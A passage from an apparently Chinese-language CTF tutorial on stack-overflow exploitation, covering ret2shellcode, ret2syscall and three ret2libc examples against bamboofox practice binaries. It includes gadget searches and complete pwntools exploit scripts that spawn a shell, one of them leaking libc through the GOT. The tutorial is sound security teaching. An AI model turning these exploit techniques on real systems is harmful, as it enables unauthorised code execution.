\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 vmmap Start End Offset Perm Path 0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so 0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so 0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so 0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so 0xf7faf000 0xf7fb2000 0x00000000 rwx 0xf7fd3000 0xf7fd5000 0x00000000 rwx 0xf7fd5000 0xf7fd7000 0x00000000 r-- [ vvar ] 0xf7fd7000 0xf7fd9000 0x00000000 r-x [ vdso ] 0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so 0xf7ffb000 0xf7ffc000 0x00000000 rwx 0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so 0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so 0xfffdd000 0xffffe000 0x00000000 rwx [ stack ] \u901a\u8fc7 vmmap\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 bss \u6bb5\u5bf9\u5e94\u7684\u6bb5\u5177\u6709\u53ef\u6267\u884c\u6743\u9650 0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode \u90a3\u4e48\u8fd9\u6b21\u6211\u4eec\u5c31\u63a7\u5236\u7a0b\u5e8f\u6267\u884c shellcode\uff0c\u4e5f\u5c31\u662f\u8bfb\u5165 shellcode\uff0c\u7136\u540e\u63a7\u5236\u7a0b\u5e8f\u6267\u884c bss \u6bb5\u5904\u7684 shellcode\u3002\u5176\u4e2d\uff0c\u76f8\u5e94\u7684\u504f\u79fb\u8ba1\u7b97\u7c7b\u4f3c\u4e8e ret2text \u4e2d\u7684\u4f8b\u5b50\u3002 \u5177\u4f53\u7684 payload \u5982\u4e0b #!/usr/bin/env python from pwn import * sh = process ( './ret2shellcode' ) shellcode = asm ( shellcraft . sh ()) buf2_addr = 0x804a080 sh . sendline ( shellcode . ljust ( 112 , 'A' ) + p32 ( buf2_addr )) sh . interactive () \u9898\u76ee \u00b6 sniperoj-pwn100-shellcode-x86-64 ret2syscall \u00b6 \u539f\u7406 \u00b6 ret2syscall\uff0c\u5373\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u83b7\u53d6 shell\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 bamboofox \u4e2d\u7684 ret2syscall \u4e3a\u4f8b \u70b9\u51fb\u4e0b\u8f7d: ret2syscall \u9996\u5148\u68c0\u6d4b\u7a0b\u5e8f\u5f00\u542f\u7684\u4fdd\u62a4 \u279c ret2syscall checksec rop Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u4e3a 32 \u4f4d\uff0c\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u3002\u63a5\u4e0b\u6765\u5229\u7528 IDA \u6765\u67e5\u770b\u6e90\u7801 int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 1 , 0 ); puts ( \"This time, no system() and NO SHELLCODE!!!\" ); puts ( \"What do you plan to do?\" ); gets ( & v4 ); return 0 ; } \u53ef\u4ee5\u770b\u51fa\u6b64\u6b21\u4ecd\u7136\u662f\u4e00\u4e2a\u6808\u6ea2\u51fa\u3002\u7c7b\u4f3c\u4e8e\u4e4b\u524d\u7684\u505a\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97 v4 \u76f8\u5bf9\u4e8e ebp \u7684\u504f\u79fb\u4e3a 108\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8986\u76d6\u7684\u8fd4\u56de\u5730\u5740\u76f8\u5bf9\u4e8e v4 \u7684\u504f\u79fb\u4e3a 112\u3002\u6b64\u6b21\uff0c\u7531\u4e8e\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684\u67d0\u4e00\u6bb5\u4ee3\u7801\u6216\u8005\u81ea\u5df1\u586b\u5199\u4ee3\u7801\u6765\u83b7\u5f97 shell\uff0c\u6240\u4ee5\u6211\u4eec\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684 gadgets \u6765\u83b7\u5f97 shell\uff0c\u800c\u5bf9\u5e94\u7684 shell \u83b7\u53d6\u5219\u662f\u5229\u7528\u7cfb\u7edf\u8c03\u7528\u3002\u5173\u4e8e\u7cfb\u7edf\u8c03\u7528\u7684\u77e5\u8bc6\uff0c\u8bf7\u53c2\u8003 https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8 \u7b80\u5355\u5730\u8bf4\uff0c\u53ea\u8981\u6211\u4eec\u628a\u5bf9\u5e94\u83b7\u53d6 shell \u7684\u7cfb\u7edf\u8c03\u7528\u7684\u53c2\u6570\u653e\u5230\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u6267\u884c int 0x80 \u5c31\u53ef\u6267\u884c\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u3002\u6bd4\u5982\u8bf4\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u5982\u4e0b\u7cfb\u7edf\u8c03\u7528\u6765\u83b7\u53d6 shell execve ( \"/bin/sh\" , NULL , NULL ) \u5176\u4e2d\uff0c\u8be5\u7a0b\u5e8f\u662f 32 \u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4f7f\u5f97 \u7cfb\u7edf\u8c03\u7528\u53f7\uff0c\u5373 eax \u5e94\u8be5\u4e3a 0xb \u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5373 ebx \u5e94\u8be5\u6307\u5411 /bin/sh \u7684\u5730\u5740\uff0c\u5176\u5b9e\u6267\u884c sh \u7684\u5730\u5740\u4e5f\u53ef\u4ee5\u3002 \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5373 ecx \u5e94\u8be5\u4e3a 0 \u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u5373 edx \u5e94\u8be5\u4e3a 0 \u800c\u6211\u4eec\u5982\u4f55\u63a7\u5236\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c \u5462\uff1f\u8fd9\u91cc\u5c31\u9700\u8981\u4f7f\u7528 gadgets\u3002\u6bd4\u5982\u8bf4\uff0c\u73b0\u5728\u6808\u9876\u662f 10\uff0c\u90a3\u4e48\u5982\u679c\u6b64\u65f6\u6267\u884c\u4e86pop eax\uff0c\u90a3\u4e48\u73b0\u5728 eax \u7684\u503c\u5c31\u4e3a 10\u3002\u4f46\u662f\u6211\u4eec\u5e76\u4e0d\u80fd\u671f\u5f85\u6709\u4e00\u6bb5\u8fde\u7eed\u7684\u4ee3\u7801\u53ef\u4ee5\u540c\u65f6\u63a7\u5236\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u6bb5\u4e00\u6bb5\u63a7\u5236\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u5728 gadgets \u6700\u540e\u4f7f\u7528 ret \u6765\u518d\u6b21\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u7684\u539f\u56e0\u3002\u5177\u4f53\u5bfb\u627e gadgets\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ropgadgets \u8fd9\u4e2a\u5de5\u5177\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6765\u5bfb\u627e\u63a7\u5236 eax \u7684gadgets \u279c ret2syscall ROPgadget --binary rop --only 'pop|ret' | grep 'eax' 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x080bb196 : pop eax ; ret 0x0807217a : pop eax ; ret 0x80e 0x0804f704 : pop eax ; ret 3 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret \u53ef\u4ee5\u770b\u5230\u6709\u4e0a\u8ff0\u51e0\u4e2a\u90fd\u53ef\u4ee5\u63a7\u5236 eax\uff0c\u6211\u9009\u53d6\u7b2c\u4e8c\u4e2a\u6765\u4f5c\u4e3a gadgets\u3002 \u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u63a7\u5236\u5176\u5b83\u5bc4\u5b58\u5668\u7684 gadgets \u279c ret2syscall ROPgadget --binary rop --only 'pop|ret' | grep 'ebx' 0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret 0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret 0x080be23f : pop ebx ; pop edi ; ret 0x0806eb69 : pop ebx ; pop edx ; ret 0x08092258 : pop ebx ; pop esi ; pop ebp ; ret 0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10 0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14 0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc 0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4 0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8 0x08048913 : pop ebx ; pop esi ; pop edi ; ret 0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4 0x08049a94 : pop ebx ; pop esi ; ret 0x080481c9 : pop ebx ; ret 0x080d7d3c : pop ebx ; ret 0x6f9 0x08099c87 : pop ebx ; ret 8 0x0806eb91 : pop ecx ; pop ebx ; ret 0x0806336b : pop edi ; pop esi ; pop ebx ; ret 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret 0x0805c820 : pop esi ; pop ebx ; ret 0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0807b6ed : pop ss ; pop ebx ; ret \u8fd9\u91cc\uff0c\u6211\u9009\u62e9 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret \u8fd9\u4e2a\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236\u5176\u5b83\u4e09\u4e2a\u5bc4\u5b58\u5668\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u9700\u8981\u83b7\u5f97 /bin/sh \u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u3002 \u279c ret2syscall ROPgadget --binary rop --string '/bin/sh' Strings information ============================================================ 0x080be408 : /bin/sh \u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u6b64\u5916\uff0c\u8fd8\u6709 int 0x80 \u7684\u5730\u5740\uff0c\u5982\u4e0b \u279c ret2syscall ROPgadget --binary rop --only 'int' Gadgets information ============================================================ 0x08049421 : int 0x80 0x080938fe : int 0xbb 0x080869b5 : int 0xf6 0x0807b4d4 : int 0xfc Unique gadgets found: 4 \u540c\u65f6\uff0c\u4e5f\u627e\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002 \u4e0b\u9762\u5c31\u662f\u5bf9\u5e94\u7684 payload\uff0c\u5176\u4e2d 0xb \u4e3a execve \u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u3002 #!/usr/bin/env python from pwn import * sh = process ( './rop' ) pop_eax_ret = 0x080bb196 pop_edx_ecx_ebx_ret = 0x0806eb90 int_0x80 = 0x08049421 binsh = 0x80be408 payload = flat ( [ 'A' * 112 , pop_eax_ret , 0xb , pop_edx_ecx_ebx_ret , 0 , 0 , binsh , int_0x80 ]) sh . sendline ( payload ) sh . interactive () \u9898\u76ee \u00b6 ret2libc \u00b6 \u539f\u7406 \u00b6 ret2libc \u5373\u63a7\u5236\u51fd\u6570\u7684\u6267\u884c libc \u4e2d\u7684\u51fd\u6570\uff0c\u901a\u5e38\u662f\u8fd4\u56de\u81f3\u67d0\u4e2a\u51fd\u6570\u7684 plt \u5904\u6216\u8005\u51fd\u6570\u7684\u5177\u4f53\u4f4d\u7f6e(\u5373\u51fd\u6570\u5bf9\u5e94\u7684 got\u8868\u9879\u7684\u5185\u5bb9)\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u9009\u62e9\u6267\u884c system(\"/bin/sh\")\uff0c\u6545\u800c\u6b64\u65f6\u6211\u4eec\u9700\u8981\u77e5\u9053 system \u51fd\u6570\u7684\u5730\u5740\u3002 \u4f8b\u5b50 \u00b6 \u6211\u4eec\u7531\u7b80\u5355\u5230\u96be\u5206\u522b\u7ed9\u51fa\u4e09\u4e2a\u4f8b\u5b50\u3002 \u4f8b1 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 bamboofox \u4e2d ret2libc1 \u4e3a\u4f8b \u70b9\u51fb\u4e0b\u8f7d: ret2libc1 \u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u68c0\u67e5\u4e00\u4e0b\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4 \u279c ret2libc1 checksec ret2libc1 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u6e90\u7a0b\u5e8f\u4e3a 32 \u4f4d\uff0c\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u3002\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u7a0b\u5e8f\u6e90\u4ee3\u7801\uff0c\u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( _bss_start , 0 , 1 , 0 ); puts ( \"RET2LIBC >_<\" ); gets (( char * ) & v4 ); return 0 ; } \u53ef\u4ee5\u770b\u5230\u5728\u6267\u884c gets \u51fd\u6570\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u6808\u6ea2\u51fa\u3002\u6b64\u5916\uff0c\u5229\u7528 ropgadget\uff0c\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u662f\u5426\u6709 /bin/sh \u5b58\u5728 \u279c ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh' Strings information ============================================================ 0x08048720 : /bin/sh \u786e\u5b9e\u5b58\u5728\uff0c\u518d\u6b21\u67e5\u627e\u4e00\u4e0b\u662f\u5426\u6709 system \u51fd\u6570\u5b58\u5728\u3002\u7ecf\u5728 ida \u4e2d\u67e5\u627e\uff0c\u786e\u5b9e\u4e5f\u5b58\u5728\u3002 .plt: 08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND] \u90a3\u4e48\uff0c\u6211\u4eec\u76f4\u63a5\u8fd4\u56de\u8be5\u5904\uff0c\u5373\u6267\u884c system \u51fd\u6570\u3002\u76f8\u5e94\u7684 payload \u5982\u4e0b #!/usr/bin/env python from pwn import * sh = process ( './ret2libc1' ) binsh_addr = 0x8048720 system_plt = 0x08048460 payload = flat ([ 'a' * 112 , system_plt , 'b' * 4 , binsh_addr ]) sh . sendline ( payload ) sh . interactive () \u8fd9\u91cc\u6211\u4eec\u9700\u8981\u6ce8\u610f\u51fd\u6570\u8c03\u7528\u6808\u7684\u7ed3\u6784\uff0c\u5982\u679c\u662f\u6b63\u5e38\u8c03\u7528 system \u51fd\u6570\uff0c\u6211\u4eec\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u8fd4\u56de\u5730\u5740\uff0c\u8fd9\u91cc\u4ee5 'bbbb' \u4f5c\u4e3a\u865a\u5047\u7684\u5730\u5740\uff0c\u5176\u540e\u53c2\u6570\u5bf9\u5e94\u7684\u53c2\u6570\u5185\u5bb9\u3002 \u8fd9\u4e2a\u4f8b\u5b50\u76f8\u5bf9\u6765\u8bf4\u7b80\u5355\uff0c\u540c\u65f6\u63d0\u4f9b\u4e86 system \u5730\u5740\u4e0e /bin/sh \u7684\u5730\u5740\uff0c\u4f46\u662f\u5927\u591a\u6570\u7a0b\u5e8f\u5e76\u4e0d\u4f1a\u6709\u8fd9\u4e48\u597d\u7684\u60c5\u51b5\u3002 \u4f8b2 \u00b6 \u8fd9\u91cc\u4ee5 bamboofox \u4e2d\u7684 ret2libc2 \u4e3a\u4f8b \u70b9\u51fb\u4e0b\u8f7d: ret2libc2 \u8be5\u9898\u76ee\u4e0e\u4f8b 1 \u57fa\u672c\u4e00\u81f4\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u518d\u51fa\u73b0 /bin/sh \u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6b64\u6b21\u9700\u8981\u6211\u4eec\u81ea\u5df1\u6765\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e24\u4e2a gadgets\uff0c\u7b2c\u4e00\u4e2a\u63a7\u5236\u7a0b\u5e8f\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u4e2a\u63a7\u5236\u7a0b\u5e8f\u6267\u884c system(\"\"/bin/sh\")\u3002\u7531\u4e8e\u6f0f\u6d1e\u4e0e\u4e0a\u8ff0\u4e00\u81f4\uff0c\u8fd9\u91cc\u5c31\u4e0d\u5728\u591a\u8bf4\uff0c\u5177\u4f53\u7684 exp \u5982\u4e0b ##!/usr/bin/env python from pwn import * sh = process ( './ret2libc2' ) gets_plt = 0x08048460 system_plt = 0x08048490 pop_ebx = 0x0804843d buf2 = 0x804a080 payload = flat ( [ 'a' * 112 , gets_plt , pop_ebx , buf2 , system_plt , 0xdeadbeef , buf2 ]) sh . sendline ( payload ) sh . sendline ( '/bin/sh' ) sh . interactive () \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u8fd9\u91cc\u5411\u7a0b\u5e8f\u4e2d bss \u6bb5\u7684 buf2 \u5904\u5199\u5165 /bin/sh \u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u5176\u5730\u5740\u4f5c\u4e3a system \u7684\u53c2\u6570\u4f20\u5165\u3002\u8fd9\u6837\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u83b7\u5f97 shell\u3002 \u4f8b3 \u00b6 \u8fd9\u91cc\u4ee5 bamboofox \u4e2d\u7684 ret2libc3 \u4e3a\u4f8b \u70b9\u51fb\u4e0b\u8f7d: ret2libc3 \u5728\u4f8b 2 \u7684\u57fa\u7840\u4e0a\uff0c\u518d\u6b21\u5c06 system \u51fd\u6570\u7684\u5730\u5740\u53bb\u6389\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u9700\u8981\u540c\u65f6\u627e\u5230 system \u51fd\u6570\u5730\u5740\u4e0e /bin/sh \u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u9996\u5148\uff0c\u67e5\u770b\u5b89\u5168\u4fdd\u62a4 \u279c ret2libc3 checksec ret2libc3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u4ecd\u65e7\u5f00\u542f\u4e86\u5806\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\u8fdb\u800c\u67e5\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u7a0b\u5e8f\u7684 bug \u4ecd\u7136\u662f\u6808\u6ea2\u51fa int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 1 , 0 ); puts ( \"No surprise anymore, system disappeard QQ.\" ); printf ( \"Can you find it !?\" ); gets (( char * ) & v4 ); return 0 ; } \u90a3\u4e48\u6211\u4eec\u5982\u4f55\u5f97\u5230 system \u51fd\u6570\u7684\u5730\u5740\u5462\uff1f\u8fd9\u91cc\u5c31\u4e3b\u8981\u5229\u7528\u4e86\u4e24\u4e2a\u77e5\u8bc6\u70b9 system \u51fd\u6570\u5c5e\u4e8e libc\uff0c\u800c libc.so \u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u7684\u51fd\u6570\u4e4b\u95f4\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684\u3002 \u5373\u4f7f\u7a0b\u5e8f\u6709 ASLR \u4fdd\u62a4\uff0c\u4e5f\u53ea\u662f\u9488\u5bf9\u4e8e\u5730\u5740\u4e2d\u95f4\u4f4d\u8fdb\u884c\u968f\u673a\uff0c\u6700\u4f4e\u768412\u4f4d\u5e76\u4e0d\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u800c libc \u5728github\u4e0a\u6709\u4eba\u8fdb\u884c\u6536\u96c6\uff0c\u5982\u4e0b https://github.com/niklasb/libc-database \u6240\u4ee5\u5982\u679c\u6211\u4eec\u77e5\u9053 libc \u4e2d\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u786e\u5b9a\u8be5\u7a0b\u5e8f\u5229\u7528\u7684 libc\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u77e5\u9053 system\u51fd\u6570\u7684\u5730\u5740\u3002 \u90a3\u4e48\u5982\u4f55\u5f97\u5230 libc \u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\u5462\uff1f\u6211\u4eec\u4e00\u822c\u5e38\u7528\u7684\u65b9\u6cd5\u662f\u91c7\u7528 got \u8868\u6cc4\u9732\uff0c\u5373\u8f93\u51fa\u67d0\u4e2a\u51fd\u6570\u5bf9\u5e94\u7684 got \u8868\u9879\u7684\u5185\u5bb9\u3002 \u5f53\u7136\uff0c\u7531\u4e8e libc \u7684\u5ef6\u8fdf\u7ed1\u5b9a\u673a\u5236\uff0c\u6211\u4eec\u9700\u8981\u6cc4\u6f0f\u5df2\u7ecf\u6267\u884c\u8fc7\u7684\u51fd\u6570\u7684\u5730\u5740\u3002 \u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u6b65\u9aa4\u5148\u5f97\u5230 libc\uff0c\u4e4b\u540e\u5728\u7a0b\u5e8f\u4e2d\u67e5\u8be2\u504f\u79fb\uff0c\u7136\u540e\u518d\u6b21\u83b7\u53d6 system \u5730\u5740\uff0c\u4f46\u8fd9\u6837\u624b\u5de5\u64cd\u4f5c\u6b21\u6570\u592a\u591a\uff0c\u6709\u70b9\u9ebb\u70e6\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a libc \u7684\u5229\u7528\u5de5\u5177\uff0c\u5177\u4f53\u7ec6\u8282\u8bf7\u53c2\u8003 readme https://github.com/lieanu/LibcSearcher \u6b64\u5916\uff0c\u5728\u5f97\u5230 libc \u4e4b\u540e\uff0c\u5176\u5b9e libc \u4e2d\u4e5f\u662f\u6709 /bin/sh \u5b57\u7b26\u4e32\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4e00\u8d77\u83b7\u5f97 /bin/sh \u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002 \u8fd9\u91cc\u6211\u4eec\u6cc4\u9732 __libc_start_main \u7684\u5730\u5740\uff0c\u8fd9\u662f\u56e0\u4e3a\u5b83\u662f\u7a0b\u5e8f\u6700\u521d\u88ab\u6267\u884c\u7684\u5730\u65b9\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u6cc4\u9732 __libc_start_main \u5730\u5740 \u83b7\u53d6 libc \u7248\u672c \u83b7\u53d6 system \u5730\u5740\u4e0e /bin/sh \u7684\u5730\u5740 \u518d\u6b21\u6267\u884c\u6e90\u7a0b\u5e8f \u89e6\u53d1\u6808\u6ea2\u51fa\u6267\u884c system(\u2018/bin/sh\u2019) exp \u5982\u4e0b #!/usr/bin/env python from pwn import * from LibcSearcher import LibcSearcher sh = process ( './ret2libc3' ) ret2libc3 = ELF ( './ret2libc3' ) puts_plt = ret2libc3 . plt [ 'puts' ] libc_start_main_got = ret2libc3 . got [ '__libc_start_main' ] main = ret2libc3 . symbols [ 'main' ] print \"leak libc_start_main_got addr and return to main again\" payload = flat ([ 'A' * 112 , puts_plt , main , libc_start_main_got ]) sh . sendlineafter ( 'Can you find it !?' , payload ) print \"get the related addr\" libc_start_main_addr = u32 ( sh . recv ()[ 0 : 4 ]) libc = LibcSearcher ( '__libc_start_main' , libc_start_main_addr ) libcbase = libc_start_main_addr - libc . dump ( '__libc_start_main' ) system_addr = libcbase + libc . dump ( 'system' ) binsh_addr = libcbase + libc . dump ( 'str_bin_sh' ) print \"get shell\" payload = flat ([ 'A' * 104 , system_addr , 0xdeadbeef , binsh_addr ]) sh . sendline ( payload ) sh . interactive () \u9898\u76ee \u00b6 train.cs.nctu.edu.tw: ret2libc shell \u83b7\u53d6\u5c0f\u7ed3 \u00b6 \u8fd9\u91cc\u603b\u7ed3\u51e0\u79cd\u5e38\u89c1\u7684\u83b7\u53d6 shell \u7684\u65b9\u5f0f\uff1a \u6267\u884c shellcode\uff0c\u8fd9\u4e00\u65b9\u9762\u4e5f\u4f1a\u6709\u4e0d\u540c\u7684\u60c5\u51b5 \u53ef\u4ee5\u76f4\u63a5\u8fd4\u56de shell \u53ef\u4ee5\u5c06 shell \u8fd4\u56de\u5230\u67d0\u4e00\u4e2a\u7aef\u53e3 shellcode \u4e2d\u5b57\u7b26\u6709\u65f6\u5019\u9700\u8981\u6ee1\u8db3\u4e0d\u540c\u7684\u9700\u6c42 \u6ce8\u610f\uff0c\u6211\u4eec\u9700\u8981\u5c06 shellcode \u5199\u5728\u53ef\u4ee5\u6267\u884c\u7684\u5185\u5b58\u533a\u57df\u4e2d\u3002 \u6267\u884c system(\"/bin/sh\")\uff0csystem('sh') \u7b49\u7b49 \u5173\u4e8e system \u7684\u5730\u5740\uff0c\u53c2\u89c1\u4e0b\u9762\u7ae0\u8282\u7684 \u5730\u5740\u5bfb\u627e \u3002 \u5173\u4e8e \"/bin/sh\"\uff0c \u201csh\u201d \u9996\u5148\u5bfb\u627e binary \u91cc\u9762\u6709\u6ca1\u6709\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c \u6bd4\u5982\u8bf4\u6709 flush \u51fd\u6570\uff0c\u90a3\u5c31\u4e00\u5b9a\u6709 sh \u4e86 \u8003\u8651\u4e2a\u4eba\u8bfb\u53d6\u5bf9\u5e94\u5b57\u7b26\u4e32 libc \u4e2d\u5176\u5b9e\u662f\u6709 /bin/sh \u7684 \u4f18\u70b9 \u53ea\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u3002 \u7f3a\u70b9 \u6709\u53ef\u80fd\u56e0\u4e3a\u7834\u574f\u73af\u5883\u53d8\u91cf\u800c\u65e0\u6cd5\u6267\u884c\u3002 \u6267\u884c execve(\"/bin/sh\",NULL,NULL) \u524d\u51e0\u6761\u540c system \u4f18\u70b9 \u51e0\u4e4e\u4e0d\u53d7\u73af\u5883\u53d8\u91cf\u7684\u5f71\u54cd\u3002 \u7f3a\u70b9 \u9700\u8981 3 \u4e2a\u53c2\u6570\u3002 \u7cfb\u7edf\u8c03\u7528 \u7cfb\u7edf\u8c03\u7528\u53f7 __NR_execve \u5728 IA-32 \u4e2d\u4e3a 11\uff0cx86-64 \u4e3a 59 \u5730\u5740\u5bfb\u627e\u5c0f\u7ed3 \u00b6 